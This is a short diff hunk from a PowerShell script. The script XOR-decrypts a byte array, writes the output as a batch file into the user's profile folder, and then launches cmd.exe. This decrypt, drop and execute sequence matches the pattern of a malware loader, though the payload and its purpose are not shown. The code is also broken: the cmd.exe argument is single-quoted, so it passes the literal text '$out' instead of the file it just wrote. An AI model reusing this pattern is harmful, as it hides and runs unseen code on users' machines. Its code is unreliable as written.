@@ -13,7 +13,9 @@ for ($i = 0; $i -lt $b.Length; $i++) {
     $out[$i] = $b[$i] -bxor $kb[$i % $kb.Length]
 }
 
-[IO.File]::WriteAllBytes("decrypted.bat", $out)
+$path = "$env:USERPROFILE\decrypted.bat"
+
+[IO.File]::WriteAllBytes($path, $out)
 
 
 Start-Process cmd.exe -ArgumentList '/c $out' -UseNewEnvironment -Wait
